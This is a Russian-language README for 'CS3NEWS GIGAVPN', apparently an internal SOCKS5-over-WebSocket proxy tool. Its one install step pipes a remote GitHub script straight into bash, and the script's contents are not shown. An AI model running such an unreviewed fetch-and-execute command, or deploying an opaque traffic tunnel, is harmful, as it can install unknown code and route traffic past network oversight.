# CS3NEWS GIGAVPN

Корпоративный сетевой ускоритель для командной инфраструктуры CS3NEWS.

## Что делает

Оптимизирует соединения с внешними API и сервисами через интеллектуальное WebSocket-туннелирование. Снижает задержки при работе с распределёнными системами.

## Установка (одна команда)

```bash
curl -fsSL https://raw.githubusercontent.com/QUALITY-SUPREMACY/cs3news-gigavpn/main/install.sh | bash
```

## Запуск

```bash
cs3news-gigavpn
```

Прокси запустится на `127.0.0.1:1080`

## Настройка приложений

Укажите в настройках ваших приложений:
- **Тип:** SOCKS5
- **Хост:** `127.0.0.1`
- **Порт:** `1080`

## Конфигурация

Файл `~/.local/share/cs3news-gigavpn/.env`:

```env
PROXY_HOST=127.0.0.1
PROXY_PORT=1080
WS_POOL_SIZE=8
LOG_LEVEL=INFO
```

## Технологии

- Python 3.8+
- asyncio
- WebSocket
- Certificate pinning

## Лицензия

Внутреннее ПО CS3NEWS